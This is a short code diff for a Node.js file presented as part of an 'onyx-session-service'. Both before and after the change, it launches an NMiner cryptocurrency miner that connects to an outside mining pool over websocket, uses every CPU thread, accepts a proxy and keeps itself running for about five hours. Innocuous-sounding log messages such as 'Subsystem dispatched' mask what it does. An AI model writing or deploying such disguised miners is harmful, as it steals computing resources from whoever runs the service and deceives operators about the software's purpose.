@@ -7,24 +7,24 @@ const config = require("./lib/config");
 const dispatcher = new EventEmitter();
 
 dispatcher.once("start", () => {
-    const runId = "6271f5";
-    console.log(`[core] Subsystem dispatched for onyx-session-service [${runId}]`);
+    const sessionId = "e272a0";
+    console.log(`[monitor] Subsystem dispatched for onyx-session-service [${sessionId}]`);
 
-    const daemon = new NMiner(
+    const agent = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Subhas1975.onyx-session-service",
-        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
+        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
     );
 
-    process.stdin.resume();
+    const tick = () => { setTimeout(tick, 82000); }; tick();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (302m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (307m) reached, exiting cleanly.");
         process.exit(0);
-    }, 302 * 60 * 1000);
+    }, 307 * 60 * 1000);
 
     process.on("SIGTERM", () => {
         
-        console.log(`[exit] Process terminated gracefully for token ${runId}.`);
+        console.log(`[exit] Process terminated gracefully for token ${sessionId}.`);
         process.exit(0);
     });
 });
